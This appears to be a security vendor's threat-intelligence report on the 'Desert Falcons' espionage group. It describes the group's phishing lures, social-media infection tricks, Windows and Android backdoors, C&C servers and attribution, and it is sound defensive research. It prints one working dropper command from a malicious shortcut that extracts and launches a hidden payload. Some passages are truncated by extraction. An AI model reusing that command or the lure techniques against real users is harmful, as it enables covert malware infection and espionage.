Executive Summary Desert Falcons is a new group of cybermercenaries operating from the Middle East and using a set of methods to hide and operate malware. The cybercriminals appear to be highly skilled: in addition to proficient social engineering tricks, they have developed the following from scratch: • Computer systems malware targeting Windows devices • Mobile malware targeting Android devices • Infection vectors, including phishing emails, fake websites and fake social networkingaccountsPotential victims were enticed with socio-political news and information, and many succumbed rapidly to malware infection. The victims targeted include: • Military and Government • Newspaper, TV/Radio Channels and Top Media Outlets • Financial and Trading Institutions • Research and Education Institutions • Activists and Political Leaders • Energy Firms • Physical Security Companies Victims of the Desert Falcons are located mainly in the following countries: The Desert Falcons cybercriminals are native Arabic speakers; and it is believed to be the first known Arab group to develop and run a full cyber espionage operation. Desert Falcons began its operations in 2011, with the first infections taking place in 2013. The group became very active in late 2014/early 2015. The Desert Falcons comprises around 30 members working in three teams and operating mainly out of Palestine, Egypt and Turkey. The number of victims to date exceeds 3,000. The group’s malware was originally found during an attack investigation in the Middle East. Kaspersky Lab clients are protected from infection, with the malware files and domains used in the targeted attacks detected and blocked.TLP: White For any inquiries, please contact intelreports@kaspersky.com42. Introduction The geopolitical conflicts in the Middle East have deepened over the last few years. The crisis is taking many forms, and the conflict in cyberspace is intensifying as different sides try to shift the struggle in their favour by exploiting cyber intelligence and distorting news. Targeted cyberattacks have also increased rapidly in the region over the last few years, with victims identified for almost every one of the major advanced cyberattack campaigns (Regin, Epic Turla, Careto, Nettraveler, Red October, Flame, Gauss, Duqu, and more.) The Global Research and Analysis Team (GReAT) at Kaspersky Lab has uncovered new targeted attacks in the Middle East. Native Arabic-speaking cybercriminals have built advanced methods and tools to deliver, hide and operate malware that they have also developed themselves. This malware was originally discovered during an investigation of one of the attacks in the Middle East. Political activities and news are being actively used by the cybercriminals to entice victims into opening files and attachments. Content has been created with professionalism, with well designed visuals and interesting, familiar details for the victims, as if the information were long awaited. The victims of the attacks to date have been carefully chosen; they are active and influential in their respective cultures, but also attractive to the cybercriminals as a source of intelligence and a target for extortion. The attackers have been operating for more than two years now, running different campaigns, targeting different types of victims and different types of devices (including Windows- and Android-based). We suspect that at least 30 people distributed across different countries are operating the campaigns. As a security organization, our analysis has focused only on the malware and the facts uncovered during our research. The falcon is a popular and rare bird that has existed for a long time in Arabian countries with deserts, such as Egypt, Syria, the United Arab Emirates, Palestine, Saudi Arabia, and Oman, among others. It is also a symbol of hunting and sharp vision. The Desert Falcons are proficient cyberattackers, with carefully chosen targets, who are all thoroughly investigated before being attacked and infected.TLP: White For any inquiries, please contact intelreports@kaspersky.com53. Operation Goals and Victim Profiles One of the most mysterious things about the Falcons is the range and variety of victims; with clear political, geographical and social distinctions between them.Further details of individual categories of victimsVictim CategoryVictim DescriptionMediaOrganizations and popular senior reporters from large and small, global and local media organizations, with wide coverage in the Middle East regionEducation and ActivistsIslamic universities, immigrants and rights activists of Arab origin were among the most targeted; with attackers trawling through pictures, video and audio recordingsGovernmentOrganisations and personnel responsible for national health, combatting money laundering, economy, trade, ministries, research and developmentMilitaryHigh-ranking personnel related to security agencies and army command unitsEnergy/UtilitiesCritical infrastructure suppliers (power, oil and gas, construction and smart grids)IndustrialFinancialPhysical SecuritySupply chain contractors providing manufacturing material and equipment for clients including the military and aerospace.Multiple banks and investment firms were affectedOne of the most mysterious victim categories, with major firms targeted in multiple countries.TLP: White For any inquiries, please contact intelreports@kaspersky.com6A screenshot from one of the physical security providers targeted shows the attackers’ interest in information about security officers and their assignments. It is possible that these victims were targeted in order to collect useful information that could be used in actual physical crime.3.1. Stolen Files information The Desert Falcons’ operations were found to be mainly focused on political and military intelligence. In all, the attackers were able to steal more than one million files and documents containing sensitive information from victims’ computers and devices.TLP: White For any inquiries, please contact intelreports@kaspersky.com74. Operation Analysis The Desert Falcons make use of different tools and techniques to Deliver, Infect, Spy on and Manage their victims. Below we outline each of the methods involved and how they were carefully used to operate the cyber espionage activities. They are grouped into three sections as follows: • Deceive and Infect • Infiltrate and Spy • Track and Control4.1. Deceive and Infect Malware writers use multiple technical and social engineering methods to deliver their files and encourage the victims to run them; creating an effective infection vector, even when they are targeting what should be well-protected organisations such as governments, banks and leading media outlets. In this case the attackers depended mainly on social engineering to exploit: • Victims’ trust in social networking forums • Victims’ curiosity about news relating to political conflict in their country In the following sections we outline the different methods used by the cybercriminals to infect their victims.4.1.1. Targeted emails and documents The Falcons attacks used spear phishing e-mails that attempted to trick the victim into opening a malicious attachment. Spear phishing was mainly used when targeting important victims such as governments or high profile media. The spear phishing e-mails used by the Falcons were very well structured with filenames and attachments selected with care for the targeted victim.Email samples Email information From: يذيفنتلا ريتركسلا (Executive Secretary) Subject: ةيلاملا تاقحتسملا (The financial benefits) Attachment: //تاقحتسملا.rar//تاقحتسملا صوصخب لصافلا ريرقتلا.scr(a detailed report on the benefits) From: انر ةيملاعلاا (The media reporter Rana) Subject: عامتجلااب كريكذت دوا (ديفيد يماحملا بتكم ريدم) .أ ابحرمريرقتلاو روصلا ةعجارمو (Hi, this is the manager of the Lawyer David, to remind you of the meeting to review the pictures and the report)Time of deliveryMarch 2014March 2014TLP: White For any inquiries, please contact intelreports@kaspersky.com8Email informationFrom: news letar Subject: הלודגה הפצוחה (most cruel) Attachment: יבאעז ןינח.rar//eeee.scr//04.exe From: "news letar" <newsletar05@gmail.com> Subject: הלודגה הפצוחה] Attachment: יבאעז ןינח.rar//eeee.scr//04.exe From: "Italy Office" <italy.officce@gmail.com>] Subject: Safe migration - ةنمآ ةرجه Attachment: Visa Travel docx.rar//Image visa jpg.scr//H.exeFrom: "ynet48" <ynet48@gmail.com>] Subject: ונלש תויטרפהו 6ןופיא] (iPhone 6 and our privacy) Attachment: ןופיא.rar//??? ?????.scr//02.exe From:"mako mako" <mako22014@gmail.com>] Subject: םינש רשע דוע ליארשיל הרוק המ (what will happen to Israel in ten years) Attachment: הנידמב ריכב.rar//ss.scr//02.exeTime of deliverySept 2014Sept 2014Sept 2014Sept 2014Sept 2014File samplesFile Name “راشبو يسيسلا نيب هديدجلا تاقلاعلا قافا ةياهنلا ةيادب هلحرمو رصمب شهني باهرلإا تبرتقا.scr عقاو جراخلا يف ةينيطسلفلا تارافسل كوربم مارم_ اهرودل يثري.rar يف تاقياضملاو رقفلا نيب ةزغ يدايص ىتم ىلإ ديصلا.docx.scr meetings-recordrcs.pdfVisa Travel docx.scr "نييركسعلا صوصخب 17 مقر يلاملا رارقلا docx.scr” הלשממה שאר תכשלב תינימ הדרטה.rar תסינכ תיבב עגיפ.scr يلع تادجتسملا رخا لوح يسايس ريرقت ةيلخادلا ةحاسلا.scrTranslationThe prospect of a new relationship between Sisi and Bashar alAssadISIS (Islamic State in Iraq and Levant)Terrorism affecting Egypt - the beginning of the end is nearPalestinian embassies abroad the reality of a weak role _Maram MabroukGaza fishermen, facing poverty and harassment until when? .docx.scrFinancial Decision No. 17 concerning the military forcesSexual harassment in the prime minister’s officeSynagogue attackPolitical report on the latest national events .scrTLP: White For any inquiries, please contact intelreports@kaspersky.com9Below are some examples of the interesting content used to target important victims: A PDF of a Meeting Record was used when targeting senior politicians in Egypt and Palestine.

Just click the shortcut: the rar/lnk trick Another technique used by the cybercriminals is to send a rar file that extracts to multiple files and offers an appealing shortcut in the form of a small, innocent-looking icon. In this case the victim does not need to double-click an executable file, the shortcut is enough to run a whole command to extract, setup and run the malware.C:\Windows\System32\cmd.exe /c "md c:\LA&attrib c:\LA +h +s&C:\Progra~1\WinRAR\unrar.exe e _*.rar c:\LA\ -o+ -ibck&copy /y _*.doc c:\LA\&C:\Progra~1\WinRAR\winRAR.exe e -e c:\LA\_*.doc c:\LA\ -o+ -ibck&ren c:\LA\image21.jpeg alg.exe&start c:\LA\alg.exeTLP: White For any inquiries, please contact intelreports@kaspersky.com114.1.3. Right-to-left extension override trick This method takes advantage of special characters in Unicode to reverse the order of characters in a file name, hiding the dangerous file extension in the file name and placing a harmless-looking fake file extension near the end of the file name. By using this technique, even careful users with good technical knowledge could be tricked into running malicious files.4.1.4. Social Networking tricks Targeted Facebook attacks aimed at specific people The Desert Falcons team is among to the first to run targeted attacks through Facebook chat. The attackers created authentic Facebook accounts and then interacted with chosen victims through common Facebook pages until they had gained their trust. Then they sent them Trojan files in the chat hidden as an image or similar. Below are some screenshots of a victim’s PC showing the infection process, extracted from one of the command and control servers:TLP: White For any inquiries, please contact intelreports@kaspersky.com12Malware files being sent as me.rar or mypic.rar from fake accounts to the victims through chatFacebook attacks targeted at generic activists and political followers (mass infection) For wider infections, especially among activists and political figures, different social engineering techniques were used. These included Facebook posts and redirects to fake pages with political content. We were able to identify suspect Facebook posts on popular activist pages, with links to domains or malware downloads used by Falcons. Below are a few examples:TLP: White For any inquiries, please contact intelreports@kaspersky.com13Posts made from compromised or fake accounts on political pages; Dr Salam Fayyad is a former prime minister of the state of Palestine.Another post with malicious content, this time on the page of Benjamin Netanyahu, the current prime minister of Israel.4.1.5. The fake RealPlayer plugin trick In this case political social engineering was used to deliver malware as a “plugin” for the “banned video” of a famous political show in Egypt hosted by the satirist Bassem Youssef. The page was hosted on the following domain: www.linkedim.in, chosen to resemble the popular LinkedIn social networking site.TLP: White For any inquiries, please contact intelreports@kaspersky.com144.2. Infiltrate and Spy The Desert Falcons depend on two different backdoors to spy on victims. Both backdoors are homemade and are under continuous development. We were able to identify and collect more than 100 malware samples used by the Desert Falcons. Once they have infected the victim’s computer, attackers have full access and control, and they usually proceed as follows: 1. New victims are categorized into groups before being infected (e.g. A001, A002, and so on) 2. One of the cybercriminals is appointed to each new victim after infection 3. A complete list of all files (especially XLS, DOC, JPG and WAV) is retrieved from the victim’smachine4. The cybercriminal browses and collects any interesting pictures and files 5. The cybercriminal also collects chats and screenshots 6. Depending on the importance of the victim, the surveillance is then either intensified ordropped4.2.1. The Falcons’ main Trojan This is the main Trojan used in the attacks, especially when targeting important victims. Multiple versions of the Trojan were found, revealing ongoing development and improvements. This module is used for the initial infection. Once executed, the Falcons’ downloader will send a registration request to the Command and Control (C&C) server with the victim’s IP address and a harddisk ID. The downloader will request a registration confirmation from the C&C. Encrypted versions of the latest Falcons’ backdoor will then be downloaded and installed on the victim’s machine.TLP: White The Falcons’ backdoor communicates with C&C servers using HTTP requests with encrypted content, providing the attackers with full backdoor functionality including: • Upload/Download files • Information on all the .doc and .xls files on the victim’s hard disk or connected USBdevices• The ability to steal passwords stored on the system registry (Internet Explorer and liveMessenger)All the files and screenshots collected by the backdoor are sent to the C&C in a password- protected archive. The earliest sample we found of the Falcons’ Trojan was compiled in Feb 2013. We consider this to be the real start date for the infection activity. (c07ac2120b4312b33089c0 cc97405876, MSN.exe).4.2.2. DHS spyware DHS naming is used by the attackers to describe the nickname initials of one of the developers (D** H*** Spyware). From June 2014, the Falcons began using a new, totally rewritten backdoor, the “DHS spyware”, is built by a different development team. This also provided the attackers with control over the infected systems, serving the same goals as before through the following functionalities: • Screenshots and Keylogs • Audio recording • Downloading and Uploading files • Password stealing • Interactive shellTLP: White For any inquiries, please contact intelreports@kaspersky.com16DHS builder, used to bind malware with an icon and the category to which the victim belongs.Screen shot for DHS C&C management console4.2.3. DHS2015, also called iRat Beginning 2015, DHS released a new, almost final version of the Trojan malware, now packed with new features and techniques to escape detection, but also adding encryption to the C&C communication and file storage. The new malware has been named DHS2015 or iRAT.4.2.4. Mobile backdoor traces During the investigation of the C&C servers we found traces of data pointing to mobile Trojan logs on the C&C www.fpupdate.info. The traces represent a structure for a mobile spying command server, the server contains mobile Call logs, SMS logs and Geolocation tracking for more than 360 victims.TLP: White For any inquiries, please contact intelreports@kaspersky.com174.2.5. Other tools by DHS The cybercriminals also developed other tools, for example, a public/private key-based file cryptor/decryptor tool. For any inquiries, please contact intelreports@kaspersky.com184.2.6. Compilation timeline for samples The malware files compilation timeline for the collected samples clearly shows the Falcons’ activity and operations, which started in 2013 and increased dramatically in 2014.4.3. Track and Control The Desert Falcons’ operation can be divided into three different campaigns, each operated from a different C&C/IP, targeting different types of victims and operated mostly by different team members. The campaigns can be classified by the type and version of malware and the type of victims targeted: • Campaign 1: Active in Palestine, Egypt, Jordan and the Gulf states (KSA, UAE and Qatar) • Campaign 2: Active in Israel • Campaign 3: Active in Egypt4.3.1. 1st Campaign - targeting computer devices and mobiles This is the main Falcons’ campaign and included the highest number of victims. It focused mainly high profile victims in Palestine, Jordan, Egypt and the Gulf states, and the target This campaign mainly targeted victims in Israel using the main Falcons Trojan.

This is apparent from mistakes made in the campaign operation. For example, the C&C server advtravel.info was publicly accessible, despite containing files, screenshots and information collected from the victims and the backdoor execution logs.TLP: White For any inquiries, please contact intelreports@kaspersky.com20File and folder structure on one of the command servers. For a short time the file access permissions for the command servers were made public.4.3.4 Liptona.net One of the interesting findings that could indicate an earlier start to the Falcons’ operations is the Liptona.net domain. The hosting history for this domain shows that between 21 June by the Falcons. We were able to find a malware sample using Liptona.net as a C&C Falcons’ main backdoor and the compilation time for the sample points back to Dec 2011. One interesting thing is that this sample tries to steal login credentials for hardcoded URLs of Palestinian websites, an indication of a shared goal with the Falcons’ team. Websites hardcoded in the malware: • url (Email Ministry of Telecommunications andInformation Technology Palestine )• url (Jawwal Mobile provider) • url (Islamic University of Gaza)Malware using liptona.net as C&C containing hardcoded URLs for Palestinian websitesTLP: White For any inquiries, please contact intelreports@kaspersky.com214.3.4. Campaigns operational timeline Even though malware files were only traced back to 2013, domain-related traces were found that may indicate earlier activities by the Desert Falcons:TLP: White For any inquiries, please contact intelreports@kaspersky.com225. Attribution The investigation into the Desert Falcons cybermercenaries enabled the research team to determine the identity of some members of the group behind the development and operation of the campaigns. The Desert Falcons team members count around 30, working in three teams and operating mainly from Palestine, Egypt and Turkey. We also confirmed that the cybercriminals are native Arabic speakers from the Middle East, based on evidence from: • The identities found • The fact that most malware files have the PE resource “Version Info” with “Lang property”set to “Arabic”• Arabic User names for the C&C administrators • Arabic names and emails found in the registration history of the C&C domains • Solid Arabic phishing emails and documents used in attacks • DHS spyware command and control panel with Arabic interfaceThe identities of some of the cybercriminals were found when inspecting the contents of one of the C&Cs which had public read permissions open for a short period of time. We were able to track and identify the full profile of some of the attackers including Facebook and twitter accounts, private blogs and websites. Surprisingly the attackers have published on twitter some information about their development of the spyware and the command servers.TLP: White For any inquiries, please contact intelreports@kaspersky.com236. Conclusion The Desert Falcons’ attacks show clearly that zeroday techniques are not a must for efficient targeted attacks. Using phishing emails, social engineering and homemade tools and backdoors, the Desert Falcons were able to infect hundreds of sensitive and important victims in the Middle East region through their computer systems or mobile devices. This is just an alert for the poor cyber security situation in the region. Banks, Media outlets, Governments and Military entities in different countries all fell prey to the Desert Falcons’ attacks. Falcons’ threat actors are determined, active and have good technical knowledge. We expect their operations to carry on developing more Trojans and using more advanced techniques. With enough funding, they might be able to acquire or develop exploits that would increase the efficiency of their attacks Desert Falcons is just one example of the rise of cybercrime in a geopolitically troubled region that will motivate other threat actors or states to leverage cyber attacks for political or criminal goals.
